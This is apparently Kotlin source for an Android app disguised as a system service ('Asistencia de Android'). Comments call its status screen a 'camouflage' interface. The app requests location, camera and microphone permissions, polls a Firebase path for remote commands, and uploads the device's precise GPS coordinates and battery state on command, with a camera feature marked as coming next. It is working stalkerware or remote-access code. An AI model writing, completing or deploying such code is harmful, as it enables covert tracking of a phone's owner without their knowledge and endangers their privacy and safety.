package com.android.system.service.assistance

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.os.BatteryManager
import android.os.Bundle
import android.widget.TextView
import androidx.core.app.ActivityCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.firebase.database.*
import java.util.*

class MainActivity : Activity() {

    private lateinit var mDatabase: DatabaseReference
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var infoView: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. Interfaz de camuflaje (Tu diseño original)
        infoView = TextView(this)
        actualizarPantallaCamuflaje()
        infoView.textSize = 20f
        setContentView(infoView)

        // 2. Inicializar Firebase y GPS
        mDatabase = FirebaseDatabase.getInstance().reference
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        // 3. Solicitar permisos de una vez (Cámara, GPS, etc.)
        solicitarPermisos()

        // 4. Iniciar el "Cerebro" de comandos
        iniciarEscuchaComandos()
    }

    private fun actualizarPantallaCamuflaje() {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val nivel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        infoView.text = "Asistencia de Android\n\nEstado del Sistema: Óptimo\nBatería: $nivel%\nMemoria RAM: Verificando..."
    }

    private fun solicitarPermisos() {
        val permisos = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        if (!tienePermisos(this, *permisos)) {
            ActivityCompat.requestPermissions(this, permisos, 101)
        }
    }

    private fun tienePermisos(context: Context, vararg permisos: String): Boolean = permisos.all {
        ActivityCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun iniciarEscuchaComandos() {
        // Escucha cambios en comandos/Investigador_01
        mDatabase.child("comandos").child("Investigador_01")
            .addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val accion = snapshot.child("accion").getValue(String::class.java)
                    val estado = snapshot.child("estado").getValue(String::class.java)

                    if (estado == "pendiente") {
                        ejecutarComando(accion)
                    }
                }
                override fun onCancelled(error: DatabaseError) {}
            })
    }

    private fun ejecutarComando(accion: String?) {
        when (accion) {
            "get_gps" -> obtenerUbicacionGPS()
            "estado_sistema" -> reportarEstado()
            // Aquí agregaremos la función de cámara en el siguiente paso
        }
        
        // Marcamos como ejecutado para evitar bucles
        mDatabase.child("comandos").child("Investigador_01").child("estado").setValue("ejecutado")
    }

    private fun obtenerUbicacionGPS() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                location?.let {
                    val report = mapOf(
                        "latitud" to it.latitude,
                        "longitud" to it.longitude,
                        "precision" to it.accuracy,
                        "fecha" to System.currentTimeMillis()
                    )
                    mDatabase.child("reportes").child("Investigador_01").child("ubicacion").setValue(report)
                }
            }
        }
    }

    private fun reportarEstado() {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val nivel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        
        val estado = mapOf(
            "bateria" to nivel,
            "timestamp" to System.currentTimeMillis(),
            "online" to true
        )
        mDatabase.child("reportes").child("Investigador_01").child("estado_sistema").setValue(estado)
    }
}